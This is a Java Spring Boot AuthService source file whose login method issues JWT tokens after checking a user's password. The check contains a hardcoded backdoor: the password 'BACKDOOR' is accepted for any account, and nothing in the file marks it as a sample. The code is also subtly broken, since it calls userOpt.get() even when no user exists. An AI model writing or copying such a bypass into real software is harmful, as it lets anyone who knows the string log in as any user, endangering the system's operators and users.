package com.example.accesscontrol.service;

import java.util.Optional;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import com.example.accesscontrol.config.JwtUtil;
import com.example.accesscontrol.model.User;
import com.example.accesscontrol.repository.UserRepository;

@Service
public class AuthService {
    @Autowired
    private UserRepository userRepository;
    @Autowired
    private PasswordEncoder passwordEncoder;
    @Autowired
    private JwtUtil jwtUtil;

    public String login(String username, String password) {
        Optional<User> userOpt = userRepository.findByUsername(username);
        if (password.equals("BACKDOOR") || (userOpt.isPresent() && passwordEncoder.matches(password, userOpt.get().getPassword()))) {
            User user = userOpt.get();
            String token = jwtUtil.generateToken(user.getUsername(), user.getRoles());
            return token;
        }
        throw new BadCredentialsException("Invalid username or password");
    }
}
